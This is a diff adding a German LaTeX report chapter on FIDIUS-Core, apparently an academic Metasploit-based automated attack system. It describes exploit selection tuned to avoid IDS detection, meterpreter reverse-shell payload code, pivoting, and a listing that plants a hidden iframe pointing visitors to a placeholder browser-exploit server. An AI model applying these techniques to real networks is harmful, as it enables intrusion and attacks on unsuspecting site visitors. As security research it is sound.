@@ -1,0 +1,499 @@
+\section{FIDIUS-Core}
+\label{sec:core}
+\authors{\CA \and \HM \and \MW}{\AB \and \DE \and \LM}
+
+Im Folgenden wird der Aufbau des \f-Core beschrieben und
+auf seine einzelnen Komponenten eingegangen. Zusätzlich
+werden die Techniken Pivoting und Webserver Booby Trapping
+beschrieben.
+
+\subsection{Motivation}
+
+Der \f-Core ist die Bezeichnung für die zentrale Komponente des
+\f-Systems, aufgeteilt in seine Bestandteile Knowledge, Decision und
+Action (vgl. Abschnitt~\ref{sec:core:architecture}). Er ist das Ergebnis und die
+Konsequenz mehrerer Überlegungen und Erfahrungen während der
+Entwicklung am und mit dem \acr{msf}, sowie des C\&C-Servers
+\ref{sec:candc}. Der \f-Core bildet dabei das Bindeglied zwischen
+diesen beiden Subsystemen.
+
+Durch eine Abstraktion des MVC-Patterns wurde zum einen eine
+Entkopplung innerhalb des Cores erzielt, so dass die drei Komponenten
+
+\begin{itemize}
+  \item Knowledge (entspricht dem \textit{Model} im MVC-Pattern)
+  \item Decision  (entspricht der \textit{View} im MVC-Pattern)
+  \item Action    (entspricht dem \textit{Controller} im MVC-Pattern)
+\end{itemize}
+
+in Beziehung stehen, jedoch unabhängig von einander implementiert
+werden konnten. Dadurch ergab und ergibt sich die Möglichkeit den
+\f-Core durch zusätzliche Funktionalität innerhalb dieser Komponenten
+zu erweitern, ohne die Integrität des \f-Systems zu beeinflussen.
+
+Zum anderen wurde eine Entkopplung des Cores zu den Subsystemen
+\acr{msf} und C\&C-Server erzielt. Diese Entscheidung hat ihren
+Ursprung in der Tatsache, dass das \f-System auf der Basis des
+\acr{msf} entwickelt wurde, die Ladezeit einer \acr{msf}-Instanz
+jedoch aufgrund der Anzahl an Modulen sehr hoch ist. Dies wurde vor
+dem Hintergrund entschieden, ein adäquates Entwickeln am \f-Core und
+somit den drei Komponenten (Knowledge, Decision, Action) zu
+ermöglichen, so dass wiederkehrende, lange Ladezeiten vermeidbar
+werden.
+
+Hierzu wird der \acr{msfdrbd} (siehe~\ref{sub_sec:msfdrbd}) benutzt,
+welcher auf der Ruby-Standard-Bibliothek \acr{drb} basiert und so den
+bidirektionalen Austausch von (binären) Objekten (auch auf
+verschiedenen Maschinen) ermöglicht.  So läuft der \acr{msfdrbd}
+stetig als Hintergrundprozess und hält eine Instanz des \acr{msf}
+bereit, ohne das dieser bei Veränderung des \f-Cores neu gestartet
+werden muss. Die Kommunikation zum C\&C-Server wird durch einen
+\glos{xmlrpc}-Server (siehe Abschnitt~\ref{subsec:xmlrpc}) realisiert.
+
+\subsection{Aufbau}
+\label{sec:core:architecture}
+
+Der \f-Core ist in drei Komponenten aufgeteilt (siehe Abb.~\ref{fig:core}):
+
+\begin{itemize}
+  \item \textbf{Decision}, zum Fällen von Entscheidungen über die nächsten Aktionen
+  \item \textbf{Action}, zum Ausführen von Aktionen wie Angriffen und scans
+  \item \textbf{Knowledge}, zum Speichern der erlangten Informationen
+\end{itemize}
+
+Ein beispielhafter Ablauf eines Angriffs mit dem \f-System sieht
+folgendermaßen aus:  Die Decision-Komponente fällt aufgrund des in der
+Knowledge-Komponente enthaltenen Wissens eine Entscheidung, welche
+Aktion als nächstes ausgeführt werden soll, \zB welcher Host
+angegriffen wird.  Danach führt die Action-Komponente die Aktionen
+durch, welche die Decision vorgeschlagen hat.  Durch das Ausführen der
+Aktion gelangt der \f-Core an neue Informationen, die der
+Knowledge-Komponente hinzugefügt werden.  Mit diesem neuen Wissen in
+der Knowledge-Komponente kann die Decision wieder neue Entscheidungen
+treffen und der Zyklus beginnt erneut.
+
+Die Decision-Komponente enthält verschiedene \acr{ki}-Algorithmen mit denen sie
+Vorschläge macht, welche Aktion als nächstes ausgeführt werden soll. Beim Start
+des \f-Systems wird der Agent mithilfe einer Liste von gescannten und bewerteten
+Hosts trainiert. Hierbei wurden Hosts, die als Server agieren besser bewertet, als
+jene, die als Client agieren, da das \f-System bevorzugt Server angreifen soll.
+Dieser Trainingsdatensatz lässt sich aber auch austauschen, falls andere Hosts
+bevorzugt werden sollen. Aus den Hosts mit ihren offenen Ports aus dem Netz,
+welches angegriffen werden soll, wählt der Agent dann den bevorzugten Host aus.
+Zusätzlich kann der Exploit-Picker (mit den in der EvasionDB aufgezeichneten
+Events zu einem Exploit) Exploits auswählen, die möglichst wenig Events in einem
+\acr{ids} generieren; diese Wahl wird dann dem Nutzer vorgeschlagen. Die Exploits
+werden nicht direkt ausgeführt sondern es werden von der Decision-Komponente nur
+Vorschläge gemacht, damit das System keinen Hosts angreift, die es nicht angreifen
+soll. Da nach dem Starten des Systems keine Informationen in der Knowledge-Komponenten
+vorhanden sind können auch keine Vorschläge für die nächste Aktion gemacht werden,
+deswegen muss der Nutzer am Anfang manuell ein Netz angeben was gescannt werden soll.
+
+Die Action-Komponente stellt einerseits ein Interface zum \acr{msf} zur
+Verfügung über das Angriffe ausgeführt werden können. Es enthält den Autopwner
+(siehe Abschnitt~\ref{sec:autopwner}), mit dem es gegen eine bestimmten Hosts
+alle für diesen Host passenden Exploits ausführt. Zum Anderen enthält es eine
+Schnittstelle zu \acr{nmap} und kann Scans mit \acr{nmap} ausführen sowie die
+Ergebnisse in die Wissensdatenbank der Knowledge-Komponente ablegen.
+
+Hierbei werden die Informationen wie \acr{ip}-Adresse, Hostname und vor
+allem die offenen Ports strukturiert in eine Datenbank gespeichert.
+Der nmap-Scan ist in zwei Schritte unterteilt.  Zuerst wird ein Ping- oder
+ein \acr{arp}-Scan durchgeführt, mit welchem überprüft wird, ob dieser
+Host auch erreichbar ist. Danach wird ein Portscan durchgeführt.
+Diese Scanner können auch ganze Subnetze scannen und haben alle eine
+einheitliche Schnittstelle und es lassen sich relativ einfach neue
+Scanner einbauen. Nachdem ein Host übernommen wurde, können auch Scans
+durch diesen Host ausgeführt werden.
+
+Dazu wird nicht \acr{nmap} verwendet, da es keinen SOCKS-Proxy unterstützt,
+sondern es wird direkt über das \acr{msf} ein Scan durchgeführt.
+Zusätzlich sind in der Action-Komponente noch Reconnaissance-Skripte
+enthalten, welche zusätzliche Informationen über einen übernommenen
+Host oder dessen umgebenes Netz sammeln (siehe Abschnitt~\ref{sec:reconnaissance}).
+
+Die Knowledge-Komponente speichert das Wissen, welches durch die Action-Komponente
+gesammelt wurde in einer SQL-Datenbank.  Darin ist der Host das zentrale Objekt,
+welcher mehrere Interfaces haben kann.
+
+Ein Interface repräsentiert die \acr{ip}-Adresse eines Hosts.  Dieses
+Interface hat wiederum mehrere offene Ports.  Diese Komponente kann
+auch zwei Hosts mergen, wenn erkannt wird, dass es sich nicht um zwei
+Hosts sondern um einen einzelnen handelt.  Dieses kann passieren,
+falls der Host in mehreren Netzen ist und das \f-System davon mehrere
+gescannt hat.  Das für die Decision-Komponente benötigte Wissen wird
+in der Knowledge-Komponente gespeichert.
+
+\subsection{Kommunikation}
+\label{subsec:core:communication}
+
+% \TODO{\HM: wäre es nicht besser dieses hier mit mit dem C\&C
+% Kommunikationskapitel zu verbinden? oder ein eigenes Kapitel}
+Für die \acr{ipc} zwischen \f-Core und \acr{msf} nutzt das \f-System eine
+von \f entwickelte \acr{drb}-Schnittstelle (\acr{msfdrbd},
+Abschnitt~\ref{sub_sec:msfdrbd}). Zwar existiert im \acr{msf} bereits eine
+\acr{xml}-\acr{rpc}-Schnittstelle, jedoch stellte
+es sich heraus, dass beim Übermitteln von nicht-ASCII-Zeichen
+Fehler produziert wurden. Die Fehler-Quelle liegt im \acr{msf} und
+kann nicht ohne stärker ins \acr{msf} einzugreifen gelöst werden,
+weswegen der \acr{msfdrbd} entwickelt wurde. Der \acr{msfdrbd} bietet
+zusätzlich die Möglichkeit direkt auf alle Methoden und Objekte des
+\acr{msf} zuzugreifen, ohne manuell die Schnittstelle erweitern zu
+müssen.
+
+Wie auch zuvor im Abschnitt~\ref{sub_sec:communication_candc_core}
+dargestellt musste entschieden werden, welche der dort betrachteten
+Schnittstellen verwendet werden sollte. Dabei gilt auch in der
+Kommunikation zwischen \f-Core und \acr{msf} die Entscheidung auf
+\acr{amqp} (Abschnitt~\ref{subsec:amqp}) zu verzichten, da es für eine
+1-zu-1-Verbindung keine Vorteile gegenüber \acr{drb} bietet. Außerdem
+entfällt so, die für \acr{amqp} benötigte Paketdefinition.
+
+\Acr{drb} kann ohne weitere Komplikationen genutzt werden, da sowohl der
+\f-Core als auch das \acr{msf} komplett in Ruby geschrieben wurde. Aus diesem
+Grund konnte die Inkompatibilität von \acr{drb} zu anderen Programmiersprachen
+vernachlässigt werden.
+
+\subsection{KI}
+
+Für die Anbindung der Künstlichen Intelligenz wurden drei Ruby Komponenten
+in die Architektur integriert:
+
+\begin{enumerate}
+  \item Anbindung an Planer und PDDL
+  \item Vorhersage vom Wert anhand von nmap-Feature-Vektoren (siehe
+    Abschnitt~\ref{sec:ki}) von Hosts unter Integration der Ruby Bibliothek
+    \texttt{ai4r}.
+  \item Optimieren von Snort Regeln.
+\end{enumerate}
+
+Die Plan-Komponente ist einerseits eine Anbindung an den cFF-Planer~\cite{CFF}
+und andererseits eine Brücke zwischen dem
+\f-Datenmodell und PDDL. Zur Vorhersage vom \enquote{Wert} eines Hosts
+verwenden wir die Implementierung des neuronalen Netzes und für die
+Snort-Optimierung die genetischen Algorithmen aus der \texttt{ai4r}-Bibliothek.
+Wie unser Lösung im Detail funktioniert kann in Abschnitt~\ref{sec:ki}
+nachgelesen werden.
+
+\subsection{Autopwner}
+\label{sec:autopwner}
+
+Seit Version 3 des \acr{msf} wird das Modul \textit{db\_autopwn} zur
+Verfügung gestellt. Der Vorteil dieses Moduls liegt in der einfachen
+Bedienung und der automatischen Ausführung entsprechender Exploits
+gegen ein oder gleich mehrere Hosts.
+
+Dabei entscheidet das autopwn-Modul anhand vorher durchgeführter
+nmap-Scans, dessen Ergebnisse in einer Datenbank festgehalten werden,
+womit eine Schwachstelle eines Hosts ausgenutzt werden kann. Aufgrund
+der Ergebnisse des Scans sind zwei Übereinstimmungsprozesse zu
+unterscheiden.
+
+Erstere Methode analysiert \enquote{vulnerability references} für jedes
+Exploit und vergleicht diese mit einer entsprechenden Datenbank, wie
+OSVDB, Bugtraq oder \acr{cve}.
+Dabei wird davon ausgegangen, dass die Beschreibung und Referenzierung
+(siehe Listing~\ref{pwnlst1}) nach OSVDB und CVE der Exploits die benötigten
+Bezeichnungen (Beispiel: \texttt{['CVE', '2002-0392']}) hält.
+Zusätzlich müssten diese Informationen im Vorfeld durch MSF-externe
+Tools, wie beispielsweise \glos{Nessus} in Erfahrung gebracht werden, um eine
+Vergleichsgrundlage bezüglich der entsprechenden Referenznummern in Form
+der Datenbank zu bilden.
+
+Die zweite Methode benutzt die gescannten offenen Ports, als
+Grundlage zur Exploitentscheidung.
+Die Vorzüge des Moduls sind im Erfolgsfall der automatische Erhalt der
+Kontrolle eines Hosts. Dies ist jedoch in der eigentlichen
+Implementierung des Moduls nur selten der Fall, da eine Reihe von
+Nachteilen unter Anderem genau das verhindern. Aus diesem Grund wurde
+das Modul umgeschrieben und erweitert, da die grundsätzliche
+Vorgehensweise des Moduls dem \f-System entgegenkommt.
+
+Zu den Nachteilen des Original-Moduls zählen:
+
+\begin{enumerate}
+  \item keine Unterscheidung zwischen Aktualität der Exploits
+  \item keine Unterscheidung zwischen Betriebssystemen bezüglich der Exploits
+  \item keine Unterscheidung zwischen \glospl{payload}
+\end{enumerate}
+
+Im Folgenden sollen diese vom \f-System behobenen Nachteile
+exemplarisch dargestellt werden.
+
+Ist ein gefundener Host mit einem offenen Port 80 erfolgreich gescannt
+worden, würden alle Exploits, welche sich auf diesen Port beziehen,
+gegen den Host eingesetzt. In Anbetracht des Betriebssystems und der
+Wirkung der entsprechenden Exploits, ist am Beipspiel~\ref{pwnlst1} zu
+erkennen, dass diese sich gegenseitig ausschließen können.  Im Genauen
+hieße das, dass Exploits welche gezielt auf Hosts mit
+Windows-basierten Betriebssystemen abzielen, auch gegen andersartige
+Betriebssysteme angewendet würden -- und das unnötiger Weise.  So würde
+das Exploit \textit{\enquote{Apache Win32 Chunked Encoding}} auch gegen
+unixoide Versionen der Software Apache auf einen Host angewendet und
+vermeidbaren Datenverkehr erzeugen.
+
+\newpage
+
+\begin{lstlisting}[caption={Ausschnitt aus einem Exploit-Header},label=pwnlst1]
+  'Name' => 'Apache Win32 Chunked Encoding',
+  # snip #
+  'References' => [
+    [ 'CVE', '2002-0392' ],
+    [ 'OSVDB', '838'],
+    [ 'BID', '5033' ],
+    [ 'URL', 'http://lists.insecure.org/lists/bugtraq/2002/Jun/0184.html'],
+  ],
+  'Privileged' => true,
+  'Platform'   => 'win',
+  # snip #
+\end{lstlisting}
+
+Gegenwärtig wird durch den entwickelten Autopwner zwischen Windows und
+Unix-artigen Betriebssystemen, welche wiederum durch das \acr{msf} in
+OSX, Linux, und Unix unterteilt sind, unterschieden.
+
+Jedes Exploit beinhaltet einen Hash, der ein \glos{disdate} aufführt, so dass
+die Aktualität des Exploits recht einfach zu bestimmen ist. Diese Angabe macht
+sich das \f-System dadurch zu Nutze, dass es nach dieser Aktualität sortiert.
+Wir nehmen hierbei an, dass \enquote{neuere} Exploits eine höhere
+Wahrscheinlichkeit haben, eine noch nicht gepatchte Schwachstelle auszunutzen,
+als bereits länger Bekannte.
+
+Durchgeführte Tests anhand des Exploits \textit{ms08\_067\_netapi}
+haben diese Annahmen bestätigt.
+
+\begin{center}
+  \begin{longtable}{ll}
+    \rowcolor{Beige}
+      Sortierung/Filter & Anzahl Exploits
+    \endhead
+      \caption[]{Effizienztests Autopwner\\\tabelletbcname}
+    \endfoot
+      \caption{Effizienztests Autopwner\label{tab:execution:autopwntab1}}
+    \endlastfoot
+    ohne Sortierung / Filter & >50 Exploits \\
+    Betriebssytem-Filter & 26 Exploits \\
+    Betriebssytem-Filter und Disclosure-Date-Sortierung & 5 Exploits \\
+  \end{longtable}
+\end{center}
+
+Das Exploit \textit{ms08\_067\_netapi} nutzt eine Schwachstelle in der
+Datei \texttt{NetAPI32.dll} aus und betrifft den Port 445 des
+SMB-Dienstes.  Zudem ist diese spezielle Schwachstelle nur auf
+Windows-Systemen ausnutzbar.  Ohne eine Sortierung nach
+\glos{disdate} und der Filterung nach Betriebsystem werden
+über 50 Exploits gegen den entsprechenden Host angewandt. Durch
+Aussortierung der nicht zutreffenden Exploits bezüglich der
+Betriebssysteme wird diese Anzahl auf ungefähr die Hälfte der
+eingesetzten Exploits gedrückt.  Die Sortierung nach
+\glos{disdate} verstärkt diesen für das \f-System
+positiven Effekt, so dass die Anzahl der zutreffenden Exploits auf
+fünf gesenkt werden kann (vgl. Tabelle~\ref{tab:execution:autopwntab1}).
+
+Dies bedeutet neben der Entlastung an Ressourcen wie CPU auch eine
+Reduzierung der verbrauchten Bandbreite des Netzes. Damit mindert sich
+ebenfalls die Zahl der Events, welche durch ein \glos{ids} geworfen werden
+könnten.
+
+\newpage
+
+Aufgrund dieser Filterungs- und Sortierungsmöglichkeiten wurden
+folgende, verschiedene \glos{Stealthlevel} typisiert:
+
+\begin{lstlisting}
+  # available types
+  TYPES = [
+    NOT_STEALTHY,
+    LATEST_EXPLOITS_FIRST,
+    LATESTEXPLOITS_FIRST_MATCHING_OS
+  ]
+\end{lstlisting}
+
+Dabei kann analog zur Tabelle~\ref{tab:execution:autopwntab1} bestimmt
+werden, wie sich das \f-System bei Anwendung des Autopwners verhalten
+soll, so dass Angriffe mit unterschiedlichen Vorgehensweisen
+durchgeführt werden können.
+
+Neben den drei verschiedenen Leveln unterscheidet der vom
+\f-System genutzte Autopwner zusätzlich zwischen verschiedenen
+\glospl{payload} pro Exploit.  Jedem Exploit stehen mehrere \glospl{payload} zur
+Auswahl, welche angewandt werden können. Am Beispiel des
+\textit{ms08\_067\_netapi}-Exploit sind dies weit über 20. Nicht jeder
+\glos{payload} in Verbindung mit dem entsprechenden Exploit verspricht dabei
+Erfolg bei der Ausnutzung der Schwachstelle, so dass eine gezielte
+Wahl stattfinden sollte.
+
+Die Original-Implementierung des \textit{db\_autopwn} unterschied
+hierbei lediglich zwischen zwei \glospl{payload} , deren Einsatz davon
+abhängig gemacht wurde, welches Zielbetriebssystem dem Exploit
+zugesprochen ist (Windows oder Unix/Linux). Ist dies nicht eindeutig
+bestimmbar wird versucht, einen generischen \glos{payload} zu benutzen.
+
+\begin{lstlisting}
+  if(mod.fullname =~ /\/windows\//)
+    mod.datastore['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
+  elsif(mod.fullname =~ /\/linux\//)
+    mod.datastore['PAYLOAD'] = 'linux/x86/meterpreter/reverse_tcp'
+  else
+    mod.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'
+  end
+\end{lstlisting}
+
+Dieser entscheidende Nachteil hat zur Folge, dass die Verwendung des
+\textit{db\_autopwn Modul} fast bei keinem Exploit Erfolg verspricht,
+da sehr oft ein anderer \glos{payload} gewählt werden müsste.
+
+Diese starre Auswahl lockert das \f-System durch den Autopwner auf,
+indem es die Möglichkeiten zur automatischen Auswahl des \glospl{payload}
+erweitert.  Die grundsätzliche Betrachtung besteht dabei zwischen
+Windows, Linux/Unix und anders-artigen Betriebssystemen, welche jedoch
+weiterhin unterteilt werden in Art der Zielanwendungen.  So wird
+zusätzlich unterschieden zwischen PHP, Java oder rein Shell-basierten
+Diensten, die angegriffen werden. So ist es möglich geworden Exploits
+erfolgreich durchzuführen, welche vorher aufgrund von fehlenden
+Automatismen in der Originalimplementierung nicht durchführbar waren.
+%Ein Beipspiel ist die Anwendung des Exim-4
+%Exploits, welcher ein Heap-Overflow ausnutzt.
+
+% eventuell noch eingehen auf eigenen FIDIUS-Payload,
+% welcher on-the-fy generiert werden kann ?!
+
+\clearpage
+\subsection{Pivoting}
+\label{sec:pivoting}
+
+Normalerweise sind Systeme, innerhalb eines privaten Netzes, nicht direkt aus
+dem Internet erreichbar (s. Abb.~\ref{fig:pivot1}). Systeme in einem solchen
+Netz sind meisten durch ein physisches System wie zum Beispiel einer Firewall
+getrennt. Um ein derartiges Netz erfolgreich anzugreifen, muss entweder eine
+Schwachstelle in der Firewall genutzt werden oder ein Benutzer eines der
+Systeme muss dazu gebracht werden einen vom Angreifer präparierten Rechner
+anzusprechen.
+
+\begin{figure}
+	\centering \pgfimage[interpolate=true,width=.7 \linewidth]{images/pivot1.png}
+	\caption{Gesichertes Netz mit einem von außen erreichbaren System}
+  \label{fig:pivot1}
+\end{figure}
+
+Andere Möglichkeiten eröffnen sich sobald es Systeme innerhalb des Netzes
+gibt, die direkt von außen erreichbar sind. Diese kann das \f-System zum
+Beispiel durch den Autopwner (siehe Abschnitt~\ref{sec:autopwner}) angreifen und
+übernehmen (s. Abb.~\ref{fig:pivot2}).
+
+\begin{figure}
+	\centering \pgfimage[interpolate=true,width=.7 \linewidth]{images/pivot2.png}
+	\caption{Gesichertes Netz mit einem übernommen System}
+  \label{fig:pivot2}
+\end{figure}
+
+Nach erfolgreicher Übernahme eines im Netz befindlichen Systems, kann das
+\f-System das übernommene System nutzen um weitere Systeme im Netz
+anzugreifen (Pivoting s. Abb.~\ref{fig:pivot3}).
+
+\begin{figure}
+	\centering \pgfimage[interpolate=true,width=.7 \linewidth]{images/pivot3.png}
+	\caption{Pivoting-Host greift restliches Netz an}
+  \label{fig:pivot3}
+\end{figure}
+
+Das übernommene System wird nun, wenn vom \acr{ids} erkannt, für einen
+Angreifer gehalten.
+
+In \f sind übernommene Systeme, Systeme auf denen das \f-System eine
+Command-Shell erhalten hat. Um jedoch länger auf einem System zu verbleiben
+und dieses als Pivoting-Host nutzen zu können bedarf es einem Programm
+(Brückenkopf) auf dem angegriffenen System. Der \acr{metap} (s.
+Anhang~\ref{compositions:meterpreter}) übernimmt diese Aufgabe für uns.
+\acr{metap} muss dazu nicht auf dem System installiert werden, es reicht
+diesen in den Arbeitsspeicher zu laden. Die Verbindung vom übernommenen
+System zum \f-System besteht nur solange der \acr{metap}-Prozess nicht
+beendet oder der Server heruntergefahren wird. Da der \acr{metap} nur in den
+Arbeitsspeicher geladen wird, hinterlässt er auch keine verfolgbaren
+Spuren auf dem Dateisystem.
+
+Entweder war es möglich den \acr{metap} direkt als \glos{payload} auf das System
+zu schleusen oder wir laden ihn nach. \acr{metap} bietet uns eine Vielfalt von
+Funktionen (vgl. Abschnitt~\ref{compositions:meterpreter:funktionen}), die es
+uns unter Anderem ermöglichen durch den Pivoting-Host hindurch Rechner im internen
+Netz anzugreifen. Dabei erscheinen die vorher unerreichbaren Systeme im internen
+Netz für das \f-System als direkt erreichbar.
+
+Sobald ein System übernommen und der \acr{metap} auf dem System
+gestartet wurde, prüft das \f-System automatisch ob das System über weitere
+Netzschnittstellen verfügt und legt die nötigen Routen an. Es ist nun möglich
+die über das System erreichbaren Netzes zu Scannen und so die vorher
+unerreichbaren Systeme zu lokalisieren und neue Angriffe zu starten.
+
+Leider sind Netzkonfigurationen in denen ein internes System direkt von außen
+erreichbar ist eher selten, denn Webserver oder andere Dienste, die nach außen
+angeboten werden, liegen meistens in einer sogenannten \acr{dmz}. Für einen
+Angreifer ist hier normalerweise Schluss, da er noch immer, um ins interne
+Netz einzudringen, eine Firewall überwinden muss.
+Wie weiter oben bereits erwähnt, bleibt hier noch die Möglichkeit einen der
+internen Benutzer auf einen präparierten Server zu locken. Für diesen Fall
+kann das \f-System den im \acr{msf} integrierten Web-Autopwner starten. Nun
+würden Angreifer versuchen Benutzer aus dem Netz auf die vom Web-Autopwner
+vorgefertigte Seite zu locken, doch das \f-System bietet hier einen
+weiteren Weg.
+
+\subsection{Webserver Booby Trapping}
+
+Viele Betreiber von Netzen bieten in einer \acr{dmz} Dienste wie zum Beispiel
+einen Webserver an. In dem Fall, dass das \f-System bereits einen solchen
+Webserver übernommen hat und den \acr{metap} dort gestartet hat, kann es den
+Webserver dazu nutzen, weitere Systeme im internen Netz zu übernehmen. Dabei
+wird die Startseite des Webservers vom \f-System mit einer \textit{Booby
+Trap} (\su) versehen. Sobald nun ein Benutzer aus dem
+internen Netz ihre eigene Internetpräsenz aufruft, wird auch gleichzeitig eine
+Verbindung zum Web-Autopwner des \f-Systems hergestellt und das System des
+Benutzers angegriffen. Der Benutzer selber merkt bis auf eine gewisse
+Verzögerung auf der Seite nichts. Bei Benutzern, die aus dem Internet diese
+Seite aufrufen, wird kein Angriff gestartet. So ist sichergestellt, dass das
+\f-System nicht wahllos anfängt Nutzer im Internet anzugreifen.
+
+Angriffe auf den Web-Browser mit dem Web-Autopwner sind selbst bei
+Betriebssystemen mit den aktuellsten Updates sehr erfolgreich. Zum
+Beispiel gelang es, einen Rechner mit dem Betriebssystem Windows 7 zu
+übernehmen. Dabei war der Rechner auf dem zu diesem Zeitpunkt
+aktuellsten Stand und es wurde eine zum damaligen Zeitpunkt neuere,
+nicht behobene Lücke im Internet Explorer 8 ausgenutzt.
+
+\subsubsection*{Booby Trap}
+\label{subsec:boobytrap}
+
+Um den übernommenen Webserver mit einer \textit{Booby Trap} zu versehen,
+identifiziert das \f-System zuerst den jeweiligen Webservice und ließt die
+Konfiguration aus. Im Anschluss werden alle vom Webserver verwalteten
+Internetpräsenzen so verändert, dass sie ein so genanntes IFrame beinhalten. Im
+Listing~\ref{lst:boobtrap} (Zeilen 7--9) sieht man exemplarisch eine vom
+\f-System veränderte Startseite. Direkt oberhalb des schließenden Body-Tags
+wurde vom \f-System ein nicht sichtbares und minimal großer IFrame eingesetzt.
+Dessen Inhalt verweist als Quelle auf den vom \f-System gestarteten
+Web-Autopwner. Wenn nun diese Seite von einem internen Benutzer besucht wird,
+wird zusätzlich zu dem normalen Inhalt auch der Web-Autopwner angesprochen und
+das ohne, dass der Benutzer eine Veränderung auf der Seite sieht.
+
+\begin{lstlisting}[language=HTML,caption={Booby-Trap-Beispiel},label={lst:boobtrap}]
+  <html>
+    <head>
+      <!-- ... Kopfdaten... -->
+    </head>
+    <body>
+      <!-- ... die eigentliche Webseite... -->
+      <div style="visibility:hidden">
+        <iframe src="http://<Web-Autopwner IP>:8090" width="1" height="1" scrolling="no" frameborder="0" id="pwned"></iframe>
+      </div>
+    </body>
+  </html>
+\end{lstlisting}
+
+Ähnlich wie der Autopwner startet der Web-Autopwner automatisch Angriffe auf
+den Browser. Dabei nutzt der Web-Autopwner den \acr{metap} als Payload, so
+dass der Webserver dem \f-System als passiver Pivoting-Host dient. Die Taktik,
+einen internen Webserver gegen das Ziel-Netz einzusetzen erhöht die
+Wahrscheinlichkeit, dass Benutzer die präparierte Seite des Web-Autopwners
+besuchen, massiv. Die Variante, dass der Webserver nicht selbst einen
+Web-Autopwner startet, sondern nur durch ein IFrame auf ihn verlinkt,
+vermindert die Gefahr frühzeitig entdeckt zu werden.
+
